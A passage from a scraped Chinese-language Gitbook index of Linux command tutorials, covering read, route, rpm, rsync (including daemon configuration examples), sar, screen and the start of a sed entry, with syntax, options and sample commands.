参数2.2 -p 参数2.3 -a 参数2.4 -n 参数2.5 -e 参数2.6 其他参数3. IFS 变量Linux Command read tagsstart 文本管理 tagsstop 1. 用法 有时，脚本需要在执行过程中，由用户提供一部分数据，这时可以使用read命令。它将用户的输入存入一个变量，方便后面的代码使用。用户按下回车键，就表示输入结束。 read命令的格式如下。 read [-options] [variable...] 上面语法中，options是参数选项，variable是用来保存输入数值的一个或多个变量名。如果没有提供变量名，环境变量REPLY会包含用户输入的一整行数据。 下面是一个例子demo.sh。 #!/bin/bash echo -n \"输入一些文本 > \" read text echo \"你的输入：$text\" 上面例子中，先显示一行提示文本，然后会等待用户输入文本。用户输入的文本，存入变量text，在下一行显示出来。 $ bash demo.sh 输入一些文本 > 你好，世界 你的输入：你好，世界 read可以接受用户输入的多个值。 #!/bin/bash echo Please, enter your firstname and lastname read FN LN echo \"Hi! $LN, $FN !\" 上面例子中，read根据用户的输入，同时为两个变量赋值。 如果用户的输入项少于read命令给出的变量数目，那么额外的变量值为空。如果用户的输入项多于定义的变量，那么多余的输入项会包含到最后一个变量中。 如果read命令之后没有定义变量名，那么环境变量REPLY会包含所有的输入。 #!/bin/bash # read-single: read multiple values into default variable echo -n \"Enter one or more values > \" read echo \"REPLY = '$REPLY'\" 上面脚本的运行结果如下。 $ read-single Enter one or more values > a b c d REPLY = 'a b c d' read命令除了读取键盘输入，可以用来读取文件。 #!/bin/bash filename='/etc/hosts' while read myline do echo \"$myline\" done 上面的例子通过read命令，读取一个文件的内容。done命令后面的定向符 2. 参数 read命令的参数如下。 2.1 -t 参数 read命令的-t参数，设置了超时的秒数。如果超过了指定时间，用户仍然没有输入，脚本将放弃等待，继续向下执行。 #!/bin/bash echo -n \"输入一些文本 > \" if read -t 3 response; then echo \"用户已经输入了\" else echo \"用户没有输入\" fi 上面例子中，输入命令会等待3秒，如果用户超过这个时间没有输入，这个命令就会执行失败。if根据命令的返回值，转入else代码块，继续往下执行。 环境变量TMOUT也可以起到同样作用，指定read命令等待用户输入的时间（单位为秒）。 $ TMOUT=3 $ read response 上面例子也是等待3秒，如果用户还没有输入，就会超时。 2.2 -p 参数 -p参数指定用户输入的提示信息。 read -p \"Enter one or more values > \" echo \"REPLY = '$REPLY'\" 上面例子中，先显示Enter one or more values >，再接受用户的输入。 2.3 -a 参数 -a参数把用户的输入赋值给一个数组，从零号位置开始。 $ read -a people alice duchess dodo $ echo ${people[2]} dodo 上面例子中，用户输入被赋值给一个数组people，这个数组的2号成员就是dodo。 2.4 -n 参数 -n参数指定只读取若干个字符作为变量值，而不是整行读取。 $ read -n 3 letter abcdefghij $ echo $letter abc 上面例子中，变量letter只包含3个字母。 2.5 -e 参数 -e参数允许用户输入的时候，使用readline库提供的快捷键，比如自动补全。具体的快捷键可以参阅《行操作》一章。 #!/bin/bash echo Please input the path to the file: read -e fileName echo $fileName 上面例子中，read命令接受用户输入的文件名。这时，用户可能想使用 Tab 键的文件名“自动补全”功能，但是read命令的输入默认不支持readline库的功能。-e参数就可以允许用户使用自动补全。 2.6 其他参数 -d delimiter：定义字符串delimiter的第一个字符作为用户输入的结束，而不是一个换行符。 -r：raw 模式，表示不把用户输入的反斜杠字符解释为转义字符。 -s：使得用户的输入不显示在屏幕上，这常常用于输入密码或保密信息。 -u fd：使用文件描述符fd作为输入。 3. IFS 变量 read命令读取的值，默认是以空格分隔。可以通过自定义环境变量IFS（内部字段分隔符，Internal Field Separator 的缩写），修改分隔标志。 IFS的默认值是空格、Tab 符号、换行符号，通常取第一个（即空格）。 如果把IFS定义成冒号（:）或分号（;），就可以分隔以这两个符号分隔的值，这对读取文件很有用。 #!/bin/bash # read-ifs: read fields from a file FILE=/etc/passwd read -p \"Enter a username > \" user_name file_info=\"$(grep \"^$user_name:\" $FILE)\" if [ -n \"$file_info\" ]; then IFS=\":\" read user pw uid gid name home shell &2 exit 1 fi 上面例子中，IFS设为冒号，然后用来分解/etc/passwd文件的一行。IFS的赋值命令和read命令写在一行，这样的话，IFS的改变仅对后面的命令生效，该命令执行后IFS会自动恢复原来的值。如果不写在一行，就要采用下面的写法。 OLD_IFS=\"$IFS\" IFS=\":\" read user pw uid gid name home shell 另外，上面例子中， 如果IFS设为空字符串，就等同于将整行读入一个变量。 #!/bin/bash input=\"/path/to/txt/file\" while IFS= read -r line do echo \"$line\" done 上面的命令可以逐行读取文件，每一行存入变量line，打印出来以后再读取下一行。 参考： read 命令 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-28 11:00:49 "},"Linux-Command/Linux_Command_route.html":{"url":"Linux-Command/Linux_Command_route.html","title":"Linux Command Route","keywords":"","body":"Linux Command route 路由Linux Command route 路由 tagsstart 网络 tagsstop 大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在选择使用哪一台路由器将数据包发送到远程计算机上去的问题，该路由器的 IP 地址可作为该网段上所有计算机的缺省网关。 但是，当网络上拥有两个或多个路由器时，用户就不一定想只依赖缺省网关了。实际上可能想让某些远程 IP 地址通过某个特定的路由器来传递，而其他的远程 IP 则通过另一个路由器来传递。在这种情况下，用户需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。route 命令就是用来显示、人工添加和修改路由表项目的。该命令可使用如下选项： （1）route print：本命令用于显示路由表中的当前项目，在单个路由器网段上的输出结果如图所示。 （2）route add：使用本命令，可以将路由项目添加给路由表。 例如，如果要设定一个到目的网络 209.99.32.33 的路由，其间要经过 5 个路由器网段，首先要经过本地网络上的一个路由器 IP 为 202.96.123.5，子网掩码为 255.255.255.224，那么用户应该输入以下命令： route add 209.99.32.33 mask 255.255.255.224 202.96.123.5 metric 5 （3）route change：可以使用本命令来修改数据的传输路由，不过，用户不能使用本命令来改变数据的目的地。下面这个例子将上例路由改变采用一条包含 3 个网段的路径： route add 209.99.32.33 mask 255.255.255.224 202.96.123.250 metric 3 （4）route delete 使用本命令可以从路由表中删除路由。例如：route delete 209.99.32.33 参考： route命令（详细） route command in Linux with Examples route(8) — Linux manual page 7 Linux Route Command Examples (How to Add Route in Linux) Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:06:26 "},"Linux-Command/Linux_Command_rpm.html":{"url":"Linux-Command/Linux_Command_rpm.html","title":"Linux Command Rpm","keywords":"","body":"Linux Command rpm 软件包管理1. 简介2. 参数3. 实例3.1安装3.2 列出所有安装过的包3.3 如何获得某个软件包的文件全名。3.4 一个rpm包中的文件安装到那里去了？3.5 某个程序是哪个软件包安装的Linux Command rpm 软件包管理 tagsstart 软件包管理 tagsstop 1. 简介 rpm命令是RPM软件包的管理工具。rpm原本是Red Hat Linux发行版专门用来管理Linux各项套件的程序，由于它遵循GPL规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM套件管理方式的出现，让Linux易于安装，升级，间接提升了Linux的适用度 2. 参数 -a：查询所有套件； -b+或-t +：设置包装套件的完成阶段，并指定套件档的文件名称； -c：只列出组态配置文件，本参数需配合\"-l\"参数使用； -d：只列出文本文件，本参数需配合\"-l\"参数使用； -e或--erase：删除指定的套件； -f+：查询拥有指定文件的套件； -h或--hash：套件安装时列出标记； -i：显示套件的相关信息； -i或--install：安装指定的套件档； -l：显示套件的文件列表； -p+：查询指定的RPM套件档； -q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户； -R：显示套件的关联性信息； -s：显示文件状态，本参数需配合\"-l\"参数使用； -U或--upgrade：升级指定的套件档； -v：显示指令执行过程； -vv：详细显示指令执行过程，便于排错。 3. 实例 3.1安装 rpm -ivh your-package.rpm 3.2 列出所有安装过的包 rpm -qa rpm -qa | grep sql #匹配对应的包 3.3 如何获得某个软件包的文件全名。 rpm -q mysql 3.4 一个rpm包中的文件安装到那里去了？ rpm -ql 包名 3.5 某个程序是哪个软件包安装的 rpm -qf `which 程序名` #返回软件包的全名 rpm -qif `which 程序名` #返回软件包的有关信息 rpm -qlf `which 程序名` #返回软件包的文件列表 参考： rpm command cheat sheet for Linux RPM 官方网站 RPM Package Manager (Red-hat Package Manager) How to create a Linux RPM package Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:53:54 "},"Linux-Command/Linux_Command_rsync.html":{"url":"Linux-Command/Linux_Command_rsync.html","title":"Linux Command Rsync","keywords":"","body":"Linux Command rsync 远程同步1. 简介2. 语法3. 参数4. 举例4.1. 详细执行输出4.2. 假装执行输出4.3. 显示进度条输出4.4. 递归、压缩、显示进度、保留文件属性传输4.5. 同步中删除源中没有的文件4.6. 无密码同步4.7. 有密码同步4.8. 写入同步Linux Command rsync 远程同步 tagsstart 文件管理 tagsstop 图 1.2.63.1：在这里插入图片描述 1. 简介 rsync命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 2. 语法 语法 rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync有六种不同的工作模式： 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号\":\"分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号\":\"分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号\":\"分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。如：rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。如：rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://192.168.78.192/www 3. 参数 -v, --verbose 详细模式输出。 -q, --quiet 精简输出模式。 -c, --checksum 打开校验开关，强制对文件传输进行校验。 -a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, --recursive 对子目录以递归模式处理。 -R, --relative 使用相对路径信息。 -b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。 --backup-dir 将备份文件(如~filename)存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, --links 保留软链结。 -L, --copy-links 想对待常规文件一样处理软链结。 --copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。 --safe-links 忽略指向SRC路径目录树以外的链结。 -H, --hard-links 保留硬链结。 -p, --perms 保持文件权限。 -o, --owner 保持文件属主信息。 -g, --group 保持文件属组信息。 -D, --devices 保持设备文件信息。 -t, --times 保持文件时间信息。 -S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n, --dry-run现实哪些文件将被传输。 -w, --whole-file 拷贝文件，不进行增量检测。 -x, --one-file-system 不要跨越文件系统边界。 -B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。 -e, --rsh=command 指定使用rsh、ssh方式进行数据同步。 --rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。 -C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 --delete 删除那些DST中SRC没有的文件。 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现IO错误也进行删除。 --max-delete=NUM 最多删除NUM个文件。 --partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组id匹配为用户名和组名。 --timeout=time ip超时时间，单位为秒。 -I, --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T --temp-dir=DIR 在DIR中创建临时文件。 --compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。 -P 等同于 --partial。 --progress 显示备份过程。 -z, --compress 对备份的文件在传输时进行压缩处理。 --exclude=PATTERN 指定排除不需要传输的文件模式。 --include=PATTERN 指定不排除而需要传输的文件模式。 --exclude-from=FILE 排除FILE中指定模式的文件。 --include-from=FILE 不排除FILE指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 --port=PORT 指定其他的rsync服务端口。 --blocking-io 对远程shell使用阻塞IO。 -stats 给出某些文件的传输状态。 --progress 在传输时现实传输过程。 --log-format=formAT 指定日志文件格式。 --password-file=FILE 从FILE中得到密码。 --bwlimit=KBPS 限制I/O带宽，KBytes per second。 -h, --help 显示帮助信息。 4. 举例 系统环境 服务端：192.168.211.15 客户端: 192.168.211.16 4.1. 详细执行输出 $ rsync -v root@192.168.211.15:/root/ansible-operator-v0.13.0.tar /data/ 4.2. 假装执行输出 $ rsync -nv root@192.168.211.15:/root/ansible-operator-v0.13.0.tar /data/ 4.3. 显示进度条输出 $ rsync --progress root@192.168.211.15:/root/ansible-operator-v0.13.0.tar /data/ 注意：如果当前文件是存在的，拷贝的速度会加快 4.4. 递归、压缩、显示进度、保留文件属性传输 $ rsync --progress -azv root@192.168.211.15:/root/go /data/ $ ls /data go 4.5. 同步中删除源中没有的文件 192.168.211.16 $ ls /data/shell test.sh #被删除的文件 192.168.211.15 $ ls /root/shell compare1.sh compare2.sh 192.168.211.16 $ rsync --delete --progress -azv root@192.168.211.15:/shell /data/ $ ls /data/shell compare1.sh compare2.sh 4.6. 无密码同步 服务端配置（192.168.211.15） $ vim /etc/rsyncd.conf #global settings pid file = /var/run/rsyncd.pid port = 873 lock file = /var/run/rsyncd.lock log file = /var/log/rsync.log gid = root uid = root module settings [data] path = /root/data use chroot = no max connections = 15 read only = yes write only = no list = no ignore errors = yes timeout = 120 刷新服务 $ /usr/bin/rsync --daemon 客户端 $ rsync --progress -azv root@192.168.211.15::shell /data/shell #不拷贝源目录，在目的添加目录 $ rsync --delete --progress -azv root@192.168.211.15::shell /data/shell #在目标中删除源中没有的文件 $ rsync --bwlimit=50 --progress -azv root@192.168.211.15::shell /data/shell #限制流量同步 4.7. 有密码同步 服务端 $ vim /etc/rsyncd.conf #This is the rsync daemon configuration #global settings pid file = /var/run/rsyncd.pid port = 873 lock file = /var/run/rsyncd.lock log file = /var/log/rsync.log gid = root uid = root #module settings [monitor_data] path = /root/monitor_data use chroot = no max connections = 15 read only = yes write only = no list = no ignore errors = yes timeout = 120 auth users = cloudmon secrets file = /etc/rsyncd.passwd 刷新服务 $ /usr/bin/rsync --daemon 配置用户密码 $ echo \"cloudmon:redhat123\" > /etc/rsyncd.passwd $ chmod 600 /etc/rsyncd.passwd $ mkdir -p /root/monitor_data $ cp /root/prometheus /root/monitor_data #传输的介质 客户端 $ useradd cloudmon $ echo \"redhat123\" > /home/cloudmon/rsyncd.passwd $ chmod 600 /home/cloudmon/rsyncd.passwd $ rsync -avz --progress --password-file=/home/cloudmon/rsyncd.passwd root@192.168.211.15::monitor_data /data 或者是 $ export RSYNC_PASSWORD=\"redhat123\" $ rsync -avz --progress --password-file=/home/cloudmon/rsyncd.passwd root@192.168.211.15::monitor_data /data 4.8. 写入同步 服务端 $ vim /etc/rsyncd.conf #global settings pid file = /var/run/rsyncd.pid port = 873 lock file = /var/run/rsyncd.lock log file = /var/log/rsync.log gid = root uid = root #module settings [write_data] path = /root/write_data use chroot = no max connections = 15 read only = no list = no ignore errors = yes timeout = 120 auth users = cloudmon secrets file = /etc/rsyncd.passwd $ mkdir -p /root/write_data $ touch /root/write_data/hello.txt #在目标(服务端)中删除源中没有的文件 客户端 $ echo \"123\" > /root/write_file $ export RSYNC_PASSWORD=\"redhat123\" $ rsync -avz --progress --delete /root/write_file cloudmon@192.168.211.15::write_data 更多阅读： rsync 用法教程 rsync(1) - Linux man page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:18:45 "},"Linux-Command/Linux_Command_sar.html":{"url":"Linux-Command/Linux_Command_sar.html","title":"Linux Command Sar","keywords":"","body":"Linux Command sar 网卡流量1. 简介2. 查看内存各个指标的变化情况Linux Command sar 网卡流量 tagsstart 网络 监控 tagsstop 1. 简介 如何实时查看网卡流量为多少？如何查看历史网卡流量？ 答： 安装sysstat包，使用sar命令查看。 yum install -y sysstat#安装sysstat包，获得sar命令 给 sar 增加 -n 参数就可以查看网络的统计信息，比如网络接口（DEV）、网络接口错误（EDEV）、TCP、UDP、ICMP 等等。执行下面的命令，你就可以得到网络接口统计信息： sar -n DEV#查看网卡流量，默认10分钟更新一次 sar -n DEV 1 10#一秒显示一次，一共显示10次 sar -n DEV -f /var/log/sa/sa22#查看指定日期的流量日志 # 数字1表示每隔1秒输出一组数据 $ sar -n DEV 1 Linux 4.15.0-1035-azure (ubuntu) 01/06/19 _x86_64_ (2 CPU) 13:21:40 IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil 13:21:41 eth0 18.00 20.00 5.79 4.25 0.00 0.00 0.00 0.00 13:21:41 docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 13:21:41 lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 这儿输出的指标比较多，我来简单解释下它们的含义。 rxpck/s 和 txpck/s 分别是接收和发送的 PPS，单位为包 / 秒。 rxkB/s 和 txkB/s 分别是接收和发送的吞吐量，单位是 KB/ 秒。 rxcmp/s 和 txcmp/s 分别是接收和发送的压缩数据包数，单位是包 / 秒。 %ifutil 是网络接口的使用率，即半双工模式下为 (rxkB/s+txkB/s)/Bandwidth，而全双工模式下为 max(rxkB/s, txkB/s)/Bandwidth。 其中，Bandwidth 可以用 ethtool 来查询，它的单位通常是 Gb/s 或者 Mb/s，不过注意这里小写字母 b ，表示比特而不是字节。我们通常提到的千兆网卡、万兆网卡等，单位也都是比特。如下你可以看到，我的 eth0 网卡就是一个千兆网卡： $ ethtool eth0 | grep Speed Speed: 1000Mb/s 2. 查看内存各个指标的变化情况 # 间隔1秒输出一组数据 # -r表示显示内存使用情况，-S表示显示Swap使用情况 $ sar -r -S 1 04:39:56 kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 04:39:57 6249676 6839824 1919632 23.50 740512 67316 1691736 10.22 815156 841868 4 04:39:56 kbswpfree kbswpused %swpused kbswpcad %swpcad 04:39:57 8388604 0 0.00 0 0.00 04:39:57 kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 04:39:58 6184472 6807064 1984836 24.30 772768 67380 1691736 10.22 847932 874224 20 04:39:57 kbswpfree kbswpused %swpused kbswpcad %swpcad 04:39:58 8388604 0 0.00 0 0.00 … 04:44:06 kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 04:44:07 152780 6525716 8016528 98.13 6530440 51316 1691736 10.22 867124 6869332 0 04:44:06 kbswpfree kbswpused %swpused kbswpcad %swpcad 04:44:07 8384508 4096 0.05 52 1.27 我们可以看到，sar 的输出结果是两个表格，第一个表格表示内存的使用情况，第二个表格表示 Swap 的使用情况。其中，各个指标名称前面的 kb 前缀，表示这些指标的单位是 KB。 kbcommit，表示当前系统负载需要的内存。它实际上是为了保证系统内存不溢出，对需要内存的估计值。%commit，就是这个值相对总内存的百分比。 kbactive，表示活跃内存，也就是最近使用过的内存，一般不会被系统回收。 kbinact，表示非活跃内存，也就是不常访问的内存，有可能会被系统回收。 参考： How to Use the sar Command on Linux 10 Useful Sar (Sysstat) Examples for UNIX / Linux Performance Monitoring sar(1) - Linux man page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 12:48:57 "},"Linux-Command/Linux_Command_screen.html":{"url":"Linux-Command/Linux_Command_screen.html","title":"Linux Command Screen","keywords":"","body":"Linux Command screen 后台运行1. 背景2. 简介3. 语法4. 安装screen5. 示例5.1 创建新的 Screen 会话5.2 创建命名会话5.3 创建脱离的会话5.4 列出屏幕会话5.5 连上 Screen 会话5.6 创建嵌套会话5.7 终止 Screen 会话Linux Command screen 后台运行 tagsstart 系统管理 tagsstop 1. 背景 系统管理员经常需要SSH 或者telent 远程登录到Linux 服务器，经常运行一些需要很长时间才能完成的任务，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为它们执行的时间太长了。必须等待它们执行完毕，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。 2. 简介 GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。 GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。 会话恢复 只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。 多窗口 在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享 Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。 GNU's Screen 官方站点：http://www.gnu.org/software/screen/ 3. 语法 screen [-AmRvx -ls -wipe][-d ][-h ][-r ][-s ][-S ] 参数说明 -A 　将所有的视窗都调整为目前终端机的大小。 -d 　将指定的screen作业离线。 -h 　指定视窗的缓冲区行数。 -m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。 -r 　恢复离线的screen作业。 -R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。 -s 　指定建立新视窗时，所要执行的shell。 -S 　指定screen作业的名称。 -v 　显示版本信息。 -x 　恢复之前离线的screen作业。 -ls或--list 　显示目前所有的screen作业。 -wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。 常用screen参数 screen -S yourname -> 新建一个叫yourname的session screen -ls -> 列出当前所有的session screen -r yourname -> 回到yourname这个session screen -d yourname -> 远程detach某个session screen -d -r yourname -> 结束当前session并回到yourname这个session 在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。 ◈ Ctrl + a \" - 列出所有会话 ◈ Ctrl + a 0 - 切换到会话号 0 ◈ Ctrl + a n - 切换到下一个会话 ◈ Ctrl + a p - 切换到上一个会话 ◈ Ctrl + a S - 将当前区域水平分割为两个区域 ◈ Ctrl + a l - 将当前区域垂直分割为两个区域 ◈ Ctrl + a Q - 关闭除当前会话之外的所有会话 ◈ Ctrl + a X - 关闭当前会话 ◈ Ctrl + a \\ - 终止所有会话并终止 Screen ◈ Ctrl + a ? - 显示键绑定。要退出，请按回车 C-a ? -> 显示所有键绑定信息 C-a c -> 创建一个新的运行shell的窗口并切换到该窗口 C-a n -> Next，切换到下一个 window C-a p -> Previous，切换到前一个 window C-a 0..9 -> 切换到第 0..9 个 window Ctrl+a [Space] -> 由视窗0循序切换到视窗9 C-a C-a -> 在两个最近使用的 window 间切换 C-a x -> 锁住当前的 window，需用用户密码解锁 C-a d -> detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows)丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 C-a z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去。 C-a w -> 显示所有窗口列表 C-a t -> Time，显示当前时间，和系统的 load C-a k -> kill window，强行关闭当前的 window C-a [ -> 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 vi 一样 C-b Backward，PageUp C-f Forward，PageDown H(大写) High，将光标移至左上角 L Low，将光标移至左下角 0 移到行首 $ 行末 w forward one word，以字为单位往前移 b backward one word，以字为单位往后移 Space 第一次按为标记区起点，第二次按为终点 Esc 结束 copy mode C-a ] -> Paste，把刚刚在 copy mode 选定的内容贴上 4. 安装screen 要在 Arch Linux 上安装 GNU Screen，请运行： $ sudo pacman -S screen 在 Debian、Ubuntu、Linux Mint 上： $ sudo apt-get install screen 在 Fedora 上： $ sudo dnf install screen 在 RHEL、CentOS 上： $ sudo yum install screen 在 SUSE/openSUSE 上： $ sudo zypper install screen 5. 示例 screen -S david screen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如： screen vi david.txt screen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。 5.1 创建新的 Screen 会话 让我们创建一个新的 Screen 会话并连上它。为此，请在终端中键入以下命令： screen 现在，在此会话中运行任何程序或进程，即使你与此会话断开连接，正在运行的进程或程序也将继续运行。 从 Screen 会话脱离 要从屏幕会话中脱离，请按 Ctrl + a 和 d。你无需同时按下两个组合键。首先按 Ctrl + a 然后按 d。从会话中脱离后，你将看到类似下面的输出。 [detached from 29149.pts-0.sk] 这里，29149 是 Screen ID，pts-0.sk 是屏幕会话的名称。你可以使用 Screen ID 或相应的会话名称来连上、脱离和终止屏幕会话。 5.2 创建命名会话 你还可以用你选择的任何自定义名称创建一个 Screen 会话，而不是默认用户名，如下所示。 screen -S ostechnix 上面的命令将创建一个名为 xxxxx.ostechnix 的新 Screen 会话，并立即连上它。要从当前会话中脱离，请按 Ctrl + a，然后按 d。 当你想要查找哪些进程在哪些会话上运行时，命名会话会很有用。例如，当在会话中设置 LAMP 系统时，你可以简单地将其命名为如下所示。 screen -S lampstack 5.3 创建脱离的会话 有时，你可能想要创建一个会话，但不希望自动连上该会话。在这种情况下，运行以下命令来创建名为senthil 的已脱离会话： screen -S senthil -d -m 也可以缩短为： screen -dmS senthil 上面的命令将创建一个名为 senthil 的会话，但不会连上它。 5.4 列出屏幕会话 要列出所有正在运行的会话（连上的或脱离的），请运行： screen -ls 示例输出： There are screens on: 29700.senthil (Detached) 29415.ostechnix (Detached) 29149.pts-0.sk (Detached) 3 Sockets in /run/screens/S-sk. 如你所见，我有三个正在运行的会话，并且所有会话都已脱离。 5.5 连上 Screen 会话 如果你想连上会话，例如 29415.ostechnix，只需运行： screen -r 29415.ostechnix 或： screen -r ostechnix 或使用 Screen ID： screen -r 29415 要验证我们是否连上到上述会话，只需列出打开的会话并检查。 screen -ls 示例输出： There are screens on: 29700.senthil (Detached) 29415.ostechnix (Attached) 29149.pts-0.sk (Detached) 3 Sockets in /run/screens/S-sk. 如你所见，在上面的输出中，我们目前已连上到 29415.ostechnix 会话。要退出当前会话，请按 ctrl + a d。 5.6 创建嵌套会话 当我们运行 screen 命令时，它将为我们创建一个会话。但是，我们可以创建嵌套会话（会话内的会话）。 首先，创建一个新会话或连上已打开的会话。然后我将创建一个名为 nested 的新会话。 screen -S nested 现在，在会话中按 Ctrl + a 和 c 创建另一个会话。只需重复此操作即可创建任意数量的嵌套 Screen 会话。每个会话都将分配一个号码。号码将从 0 开始。 你可以按 Ctrl + n 移动到下一个会话，然后按 Ctrl + p 移动到上一个会话。 5.7 终止 Screen 会话 如果不再需要会话，只需杀死它。要杀死名为 senthil 的脱离会话： screen -r senthil -X quit 或： screen -X -S senthil quit 或： screen -X -S 29415 quit 如果没有打开的会话，你将看到以下输出： $ screen -ls No Sockets found in /run/screens/S-sk. 更多细节请参照 man 手册页： $ man screen 还有一个名为 Tmux 的类似的命令行实用程序，它与 GNU Screen 执行相同的工作。要了解更多信息，请参阅以下指南。 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 04:14:35 "},"Linux-Command/Linux_Command_sed.html":{"url":"Linux-Command/Linux_Command_sed.html","title":"Linux Command Sed","keywords":"","body":"Linux Command sed 文本处理1. 简介2. 语法3. 参数4. 举例4.1 p：打印行4.2 d：删除行4.3 s：字符串替换4.4 -r：sed支持扩展正则4.5 多行注释4.6 r：从文件中读取输入行4.7 w：另存为某文件4.8 H:h:G:g 复制粘贴4.9 行前后添加4.10 多匹配模式Linux Command sed 文本处理 tagsstart 文件管理 tagsstop 1. 简介 Sream EDitor流式编辑器（非交互）===【vim（交互） word,记事本】 非交互，基于模式匹配过滤及修改文本 逐行处理，并将结果输出到屏幕 可实现对文本的输出，删除，替换，复制，粘贴，导出，导入等操作 2. 语法 sed [选项] '条件命令' 文件 3. 参数 